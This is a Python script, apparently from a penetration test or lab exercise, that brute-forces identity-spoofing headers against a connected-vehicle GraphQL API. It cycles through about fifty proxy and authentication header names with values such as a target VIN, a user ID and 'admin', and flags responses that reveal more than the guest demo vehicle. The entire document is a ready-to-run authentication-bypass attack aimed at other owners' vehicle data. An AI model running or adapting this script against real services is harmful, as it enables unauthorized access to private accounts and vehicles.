import requests
URL="http://10.230.164.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV6FF52FEE9EDDD86"; USER="cc-715a9a001b4a5abad5ce3ecc"
names=["X-Forwarded-User","X-Forwarded-Username","X-Forwarded-Preferred-Username","X-Forwarded-Email",
"X-Auth-Request-User","X-Auth-Request-Email","X-Auth-Request-Preferred-Username","X-Webauth-User",
"Remote-User","Remote-Email","Remote-Groups","X-Remote-User","X-Remote-User-Id","X-User","X-Username",
"X-User-Id","X-Userid","X-UserId","X-Account","X-Account-Id","X-Principal","X-Subject","X-Identity",
"X-Client-Id","X-Tenant","X-Tenant-Id","X-Org-Id","X-Organization","X-Fleet","X-Fleet-Id","X-Tsp-User",
"X-Tsp-Token","X-Tsp-Session","X-Session-Id","X-Session","Session-Id","X-Auth-User","X-Auth-UserId",
"X-Forwarded-For","X-Original-User","X-Apigateway-Api-Userinfo","X-Envoy-External-Address",
"X-Jwt-Claim-Sub","X-Jwt-Sub","X-Token-User","X-Vehicle-Owner","X-Owner","X-Owner-Id"]
vals=[USER, VIN, "admin", "engineer", "technician", "cv6"]
diffs=0; tested=0
for n in names:
    for v in vals:
        tested+=1
        try:
            r=requests.post(URL,json={"query":"{vehicles{vin label}}"},headers={n:v},timeout=5)
            t=r.text.strip()
            if t!=BASE:
                print(f"DIFF {n}: {v} -> {r.status_code} {t[:200]}",flush=True); diffs+=1
        except Exception as e:
            print("ERR",n,e)
print("tested",tested,"diffs",diffs)
